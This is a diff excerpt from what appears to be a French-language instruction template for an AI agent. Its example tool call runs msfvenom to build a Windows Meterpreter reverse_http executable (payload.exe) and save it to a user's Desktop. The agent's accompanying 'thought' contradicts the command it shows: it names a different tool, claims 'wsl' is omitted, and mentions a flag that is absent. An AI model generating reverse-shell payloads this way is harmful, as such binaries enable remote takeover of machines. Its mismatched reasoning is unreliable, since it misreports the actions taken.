@@ -1088,7 +1088,7 @@ C'est le protocole le plus critique. Suis cet arbre de décision SANS FAILLIR :
           "action": {{
             "tool_name": "execute_interactive_command",
             "parameters": {{
-              "command": "wsl /snap/bin/msfvenom -p windows/x64/meterpreter/reverse_http LHOST=localhost LPORT=8080 -f exe -oc:/Users/silve/Desktop/"eva copie"/payload/payload.exe",
+              "command": "wsl /snap/bin/msfvenom -p windows/x64/meterpreter/reverse_http LHOST=127.0.0.1 LPORT=8080 -f exe -o mnt/c/Users/silve/Desktop/"eva copie"/payload/payload.exe",
             }}
           }},
           "thought": "Je dois créer un payload avec msfvenom. J'utilise execute_shell_command, je fournis la commande Linux SANS 'wsl', je traduis le chemin de sortie Windows en chemin WSL, et je positionne 'is_linux_command' à true. L'outil s'occupera de l'appel à WSL."
